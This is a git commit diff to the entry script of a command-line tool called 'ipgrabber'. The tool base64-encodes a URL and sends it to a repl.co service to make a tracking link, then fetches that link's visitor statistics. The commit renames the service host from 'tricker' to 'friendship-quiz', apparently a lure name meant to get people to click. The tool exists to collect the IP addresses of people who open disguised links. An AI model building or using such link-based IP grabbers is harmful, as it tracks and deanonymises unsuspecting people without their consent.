3e28c84f50c3700e6cc214ee4db461dee83350bc
Kar1m <76733865+notkar1m@users.noreply.github.com>
2021-04-10 21:50:28 +0200

    Update __main__.py

--- __main__.py
+++ __main__.py
@@ -12,14 +12,14 @@ try:
             base64_bytes = base64.b64encode(message_bytes)
             base64_message = base64_bytes.decode('ascii')
             print(base64_message)
-            print(re.get(f"https://tricker.notkar1myt.repl.co/new-link-cmd_url={base64_message}").text)
+            print(re.get(f"https://friendship-quiz.notkar1myt.repl.co/new-link-cmd_url={base64_message}").text)
     elif sys.argv[1].lower() == "old":
         code = sys.argv[2].lower()
         if code == "help":
             print("ipgrabber old 1234")
             print("   command^ Code ^")
         else:
-            print(re.get(f"https://tricker.notkar1myt.repl.co/statics-cmd_code={code}").text)
+            print(re.get(f"https://friendship-quiz.notkar1myt.repl.co/statics-cmd_code={code}").text)
     elif sys.argv[1].lower() == "help":
         print("Commands:\n\nipgrabber new https://example.com  :  ipgrabber [command] [url]\nipgrabber help\nipgrabber old 1234  :  ipgrabber [command] [code]")
     else:
